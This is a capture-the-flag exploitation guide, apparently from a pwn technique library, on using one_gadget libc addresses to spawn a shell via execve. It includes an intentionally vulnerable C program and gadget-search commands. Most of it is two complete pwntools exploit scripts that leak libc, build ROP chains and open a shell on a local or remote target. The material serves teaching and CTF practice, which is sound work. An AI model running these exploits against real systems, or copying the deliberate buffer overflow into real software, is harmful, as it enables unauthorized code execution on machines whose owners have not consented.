---
title: "one_gadget - Single-Address execve and Satisfying Its Constraints"
category: pwn
subcategory: ret2libc
type: technique
tags: [one-gadget, one-gadget-rce, magic-gadget, ret2libc, rop, libc-base, execve, movaps, aslr, scanf, printf, puts, system, got, seccomp, pwntools, ropgadget, gdb, gef, libc-database]
difficulty: medium
summary: "One libc address that execve(\"/bin/sh\") by itself -- if its register and stack constraints hold. How to read them, force them true, and check live in gdb."
when_to_use:
  - "You have a libc leak but only enough space for a single 8-byte overwrite or one return address"
  - "A GOT overwrite, hook overwrite, or tcache/fastbin target gives you exactly one pointer"
  - "Your ret2libc chain does not fit because the overflow is short"
  - "system(\"/bin/sh\") crashes or the shell dies immediately and you want a different path to execve"
  - "You are overwriting a return address on a stack you only partially control"
tools: [one_gadget, pwntools, gdb, gef, pwndbg, ROPgadget, ropper, checksec, libc-database, ropr]
related: [rop-ret2libc, rop-fundamentals, rop-ret2csu, rop-got-overwrite, rop-stack-pivot, mitigation-libc-identification, mitigation-modern-playbook, stack-ret2win]
---

## TL;DR

`one_gadget` scans a libc for code paths that reach `execve("/bin/sh", argv, envp)` with no
arguments you have to set up. Each hit carries **constraints** -- registers or stack slots that
must be NULL (or writable) when you jump there. If one already holds you get a shell from a single
address; if not, two or three cheap gadgets fix it, still far shorter than a ret2libc chain.

## Recognise it

- You have a libc base (GOT leak, format string, heap leak) but a tiny write primitive: one
  return address, one GOT slot, one `__free_hook`/`__malloc_hook` in older glibc.
- The overflow leaves fewer than 4 qwords past saved RIP -- no room for
  `ret ; pop rdi ; binsh ; system`.
- A heap challenge whose only control is "make one function pointer equal X".

## Vulnerable source

```c
/* vuln.c - a short overflow: exactly one controlled return address */
#include <stdio.h>
#include <unistd.h>

void leak(void) {
    printf("puts is at %p\n", (void *)&puts);   /* the challenge hands us the leak */
}

void vuln(void) {
    char buf[32];
    printf("note> ");
    scanf("%47s", buf);        /* 47 > 32: reaches saved rbp and saved rip, nothing more */
}

int main(void) {
    setvbuf(stdout, NULL, _IONBF, 0);
    leak();
    vuln();
    return 0;
}
```

```sh
# x86-64, no canary, no PIE. The overflow reaches saved RIP and stops.
gcc -fno-stack-protector -no-pie -z noexecstack -o vuln vuln.c

ldd ./vuln                                    # which libc it runs against
one_gadget /lib/x86_64-linux-gnu/libc.so.6    # candidates for that libc
```

## Theory

### What a one_gadget actually is

Deep inside glibc, `exec_comm` (the body of `system()`) and a few `posix_spawn` helpers reach an
`execve` whose first argument is already the constant `/bin/sh` from libc's rodata. Jump *into the
middle* of that code, past the setup, and `rdi` is already correct. What is not correct is `rsi`
(argv) and `rdx` (envp), which `execve` needs to be NULL or a valid NULL-terminated array. The
constraints one_gadget prints are exactly the conditions under which those are acceptable.

### Reading the output

```
$ one_gadget ./libc.so.6
0x4f3d5 execve("/bin/sh", rsp+0x30, environ)
constraints:
  rsp & 0xf == 0
  rcx == NULL

0x4f432 execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xe3b01 execve("/bin/sh", r15, rdx)
constraints:
  [r15] == NULL || r15 == NULL
  [rdx] == NULL || rdx == NULL

0xe3b04 execve("/bin/sh", rsi, rdx)
constraints:
  [rsi] == NULL || rsi == NULL
  [rdx] == NULL || rdx == NULL
```

How to read each kind:

| Constraint | Meaning | How to satisfy |
|---|---|---|
| `rdx == NULL` | the register itself must be zero | `xor rdx, rdx ; ret` or `pop rdx ; ret` + `0` |
| `[rsi] == NULL` | the *memory* rsi points at must be zero | point `rsi` at a zeroed `.bss` page |
| `r12 == NULL` | register zero | `pop r12 ; ret` + `0` |
| `[rsp+0x30] == NULL` | the qword 0x30 bytes above the current stack top | put a `0` at that slot, or `add rsp, N ; ret` to shift the window |
| `rsp & 0xf == 0` | 16-byte stack alignment | add or remove one bare `ret` from the chain |
| `rbp-0x78 is writable` | the gadget writes below `rbp` | point `rbp` at `.bss + 0x100` with `pop rbp ; ret` |

`||` is a genuine OR: `[r15] == NULL || r15 == NULL` means *either* `r15` is zero *or* it points
at a zeroed qword -- zero is by far the easier half. The address printed is a **libc offset**;
the real target is `libc.address + offset`.

### Why the stack constraints are the awkward ones

`[rsp+0x30]` is evaluated the instant you land on the gadget. In a ROP chain `rsp` points just
past the gadget's address, so that slot is the 7th qword of whatever follows in your payload:
write zeros there and you are done. If you do not control that region -- because you overwrote a
GOT entry and the stack is whatever the program left behind -- move `rsp` somewhere you do
control with `add rsp, N ; ret`, or pivot entirely.

### The fixup gadget family

Search libc, not the binary -- once you have the base, libc has everything.

```
xor rdx, rdx ; ret            zero rdx for free, no stack slot consumed
pop rdx ; ret                 rare in libc >= 2.34, common in ld.so / older libc
pop rdx ; pop rbx ; ret       the modern replacement; supply two values
xor esi, esi ; ret            / pop rsi ; ret / pop r12 ; ret / pop r15 ; ret
pop rbp ; ret                 point rbp at .bss for "rbp-0x78 is writable"
add rsp, 0x38 ; ret           slide the rsp window so [rsp+0x30] lands on your zeros
ret                           pure alignment
```

A typical one_gadget chain is therefore three qwords, not one:
`[ pop rdx ; pop rbx ; ret ][ 0 ][ 0 ][ one_gadget ]`.

## Gadget shopping list

```sh
# every candidate with its constraints; -r for raw addresses, -l 2 for a deeper search
one_gadget ./libc.so.6
one_gadget -r ./libc.so.6

# the constraint fixups, from LIBC (after you have a base)
ROPgadget --binary ./libc.so.6 --only "pop|ret"  | grep -E "pop (rdx|rsi|r12|r15|rbp)"
ROPgadget --binary ./libc.so.6 --only "xor|ret"  | grep -E "rdx|rsi|rcx"
ROPgadget --binary ./libc.so.6 | grep -E "add rsp, 0x[0-9a-f]+ ; ret$"
ropper --file ./libc.so.6 --search "pop rdx"

# and from the binary, for the alignment ret
ROPgadget --binary ./vuln --only "ret" | head -n 3
```

## Attack

1. Get a libc leak and compute `libc.address`. Verify it ends in `000`.
2. Run `one_gadget` against the **exact** libc the target uses; a different minor version moves
   every offset.
3. Rank the candidates by how cheap their constraints are:
   register-NULL < stack-slot-NULL < writable-rbp < alignment-only.
4. Check the constraints live in gdb, then prepend fixup gadgets for whatever does not hold.
5. Fire. If every candidate fails, fall back to `system("/bin/sh")` -- see `rop-ret2libc`.

### Checking constraints live in gdb

```
# break directly ON the gadget: if it never hits, your libc base is wrong,
# not your constraints
(gdb) b *(<libc_base> + 0xe3b01)
(gdb) c
(gdb) info registers rdx rsi rcx r12 r15 rbp rsp
(gdb) x/gx $rsp+0x30          # the [rsp+0x30] == NULL constraint
(gdb) x/gx $r15               # the [r15] == NULL half of the OR
(gdb) p $rsp & 0xf            # must be 0 for the alignment constraint
(gdb) vmmap                   # gef/pwndbg: is rbp-0x78 in a writable region
```

With gef or pwndbg the same checks are `registers`, `telescope $rsp 20`, `vmmap $rbp`.

## Exploit

```python
#!/usr/bin/env python3
"""one_gadget: take a printf-provided libc leak, try every candidate, prepending
the fixups its constraints need. Falls back to system("/bin/sh").

Local: ./exploit.py    Remote: ./exploit.py HOST PORT
Build: gcc -fno-stack-protector -no-pie -z noexecstack -o vuln vuln.c
"""
import sys

from pwn import *

BINARY = "./vuln"
LIBC = "./libc.so.6"
OFFSET = 40                      # 32 byte buffer + saved rbp; verify with cyclic

# Offsets straight out of `one_gadget ./libc.so.6`; replace with YOUR libc's.
ONE_GADGETS = [        # (offset, constraint names)
    (0x4F3D5, ["align", "rcx"]),
    (0x4F432, ["rsp+0x30"]),
    (0x10A41C, ["rsp+0x70"]),
    (0xE3B01, ["r15", "rdx"]),
    (0xE3B04, ["rsi", "rdx"]),
]

context.binary = elf = ELF(BINARY, checksec=False)
context.arch = "amd64"
context.log_level = "warning"


def start():
    if len(sys.argv) >= 3:
        return remote(sys.argv[1], int(sys.argv[2]))
    return process(BINARY)


def get_leak(io):
    io.recvuntil(b"puts is at ")            # the challenge hands us &puts
    return int(io.recvline().strip(), 16)


# Per constraint: (gadget, zero slots it eats), tried in order. A zeroing
# gadget costs nothing, a pop costs one slot, the 2.34+ two-pop variant two.
RECIPES = {
    "rdx": [(["xor rdx, rdx", "ret"], 0), (["pop rdx", "ret"], 1),
            (["pop rdx", "pop rbx", "ret"], 2)],
    "rsi": [(["xor esi, esi", "ret"], 0), (["pop rsi", "ret"], 1)],
    "rcx": [(["xor ecx, ecx", "ret"], 0), (["pop rcx", "ret"], 1)],
    "r15": [(["pop r15", "ret"], 1)], "r12": [(["pop r12", "ret"], 1)],
    "rbp": [(["pop rbp", "ret"], 1)],
    "align": [(["ret"], 0)],
}


def fixups(rop, needed):
    """Gadgets that force the constraints true; rop wraps an already-rebased libc."""
    chain = b""
    for name in needed:
        if name.startswith("rsp+"):
            continue          # satisfied by the zero tail appended in try_gadget
        for insns, slots in RECIPES.get(name, []):
            found = rop.find_gadget(insns)
            if found:
                chain += p64(found.address) + p64(0) * slots
                break
        else:
            log.warning("no gadget for constraint %r - candidate may fail", name)
    return chain


def try_gadget(libc, offset, needed):
    """Fire one candidate. Returns True if we got a shell."""
    io = start()
    libc.address = get_leak(io) - libc.symbols["puts"]

    chain = fixups(ROP(libc), needed)
    chain += p64(libc.address + offset)
    # Stack-slot constraints: the qwords AFTER the gadget address are what
    # [rsp+N] reads, so zeroing the tail satisfies rsp+0x30 / rsp+0x70.
    chain += p64(0) * 20
    io.sendline(b"A" * OFFSET + chain)

    try:
        io.sendline(b"echo SHELL_OK")
        if b"SHELL_OK" in io.recvrepeat(1.0):
            log.success("one_gadget %#x worked (libc base %#x)", offset, libc.address)
            io.interactive()
            return True
    except EOFError:
        pass
    io.close()
    return False


def fallback_system(libc):
    """No one_gadget held: the classic ret ; pop rdi ; binsh ; system chain."""
    io = start()
    libc.address = get_leak(io) - libc.symbols["puts"]
    rop = ROP(libc)
    chain = p64(rop.find_gadget(["ret"]).address)
    chain += p64(rop.find_gadget(["pop rdi", "ret"]).address)
    chain += p64(next(libc.search(b"/bin/sh\x00")))
    chain += p64(libc.symbols["system"])
    io.sendline(b"A" * OFFSET + chain)
    io.interactive()


def main():
    path = LIBC if os.path.exists(LIBC) else "/lib/x86_64-linux-gnu/libc.so.6"
    libc = ELF(path, checksec=False)

    for offset, needed in ONE_GADGETS:
        log.warning("trying %#x  constraints=%s", offset, ",".join(needed))
        if try_gadget(libc, offset, needed):
            return

    log.warning("all one_gadgets failed - falling back to system(\"/bin/sh\")")
    fallback_system(libc)


if __name__ == "__main__":
    main()
```

### Minimal version: one gadget, one write

When the primitive really is a single pointer (GOT overwrite, a vtable entry), there is no room
for fixups. Pick the candidate whose constraints the *program's own* state already satisfies.

```python
#!/usr/bin/env python3
"""Single-pointer one_gadget: write libc_base + offset into the ONE pointer you
control. No room for fixups, so try every candidate in turn.

Local: ./single.py    Remote: ./single.py HOST PORT
"""
import sys

from pwn import *

BINARY = "./vuln"
LIBC = "./libc.so.6"
CANDIDATES = [0x4F3D5, 0x4F432, 0x10A41C, 0xE3B01, 0xE3B04]

context.binary = elf = ELF(BINARY, checksec=False)
context.arch = "amd64"


def start():
    if len(sys.argv) >= 3:
        return remote(sys.argv[1], int(sys.argv[2]))
    return process(BINARY)


def main():
    path = LIBC if os.path.exists(LIBC) else "/lib/x86_64-linux-gnu/libc.so.6"
    libc = ELF(path, checksec=False)

    for off in CANDIDATES:
        io = start()
        io.recvuntil(b"puts is at ")
        libc.address = int(io.recvline().strip(), 16) - libc.symbols["puts"]
        log.info("candidate %#x -> absolute %#x", off, libc.address + off)

        # The write primitive is challenge specific. Here: overwrite saved RIP.
        io.sendline(b"A" * 40 + p64(libc.address + off))
        io.sendline(b"echo GOT_SHELL")
        if b"GOT_SHELL" in io.recvrepeat(1.0):
            log.success("candidate %#x is the one", off)
            return io.interactive()
        io.close()

    log.failure("no candidate satisfied its constraints at this call site")


if __name__ == "__main__":
    main()
```

## Variants & pitfalls

- **Wrong libc, wrong offsets.** Offsets are per-build; a 2.31 offset in a 2.35 libc lands in
  unrelated code. Fingerprint first (`libc-database`, `mitigation-libc-identification`).
- **`one_gadget` finds nothing.** Newer glibc pruned some paths. Try `one_gadget -l 2`, or accept
  a two-gadget `execve` setup.
- **Alignment is invisible until it bites.** `rsp & 0xf == 0` failing looks exactly like a
  `movaps` crash: SIGSEGV inside libc at an SSE instruction. Add or remove one bare `ret`.
- **`[rsp+0x30] == NULL` in a GOT-overwrite context.** You do not control the stack there. Pick a
  register-constraint candidate instead; `add rsp, N ; ret` needs a return-address primitive,
  which a GOT overwrite does not give you.
- **`environ` as envp.** Several candidates pass `environ` for envp. That is a valid pointer
  array; do not try to zero it.
- **The shell spawns and dies instantly.** Usually stdin is closed. Call `io.interactive()`
  immediately; `execve("/bin/sh")` with no tty still runs commands you pipe in.
- **seccomp.** If `seccomp-tools dump ./vuln` shows `execve` blocked, no one_gadget can ever work;
  you need an ORW chain. See `shellcode-seccomp-orw`.
- **Statically linked binaries** have no separate libc, but `one_gadget ./vuln` sometimes still
  finds hits inside the embedded one. Worth a try.
- **Heap hooks are gone.** `__malloc_hook` / `__free_hook` were removed in glibc 2.34+. Modern
  single-pointer targets are `_IO_FILE` vtables, `__exit_funcs`, or tcache metadata. The
  one_gadget part is unchanged; only the write target moves.
- **Fall back early.** After two failed candidates, stop tuning constraints and build the
  four-qword `ret ; pop rdi ; binsh ; system` chain. More reliable, and it almost always fits.

## Tools

| Tool | Use |
|---|---|
| `one_gadget ./libc.so.6` | List candidates plus constraints. `-r` for raw addresses, `-l 2` for a deeper search |
| `ROPgadget --binary ./libc.so.6` | The `xor rdx,rdx ; ret`, `pop rdx ; ret`, `add rsp,N ; ret` fixups |
| `gdb` + `gef` / `pwndbg` | `registers`, `telescope $rsp`, `vmmap $rbp` to verify constraints live |
| `libc-database` | Identify the exact libc so the offsets are correct |
| `seccomp-tools dump ./vuln` | Confirm `execve` is not filtered before you spend time here |
| `pwntools ROP(libc).find_gadget` | Programmatic fixup lookup, already rebased |
| `ropper --file ./libc.so.6 --search "pop rdx"` | Fixup search with nicer filtering |
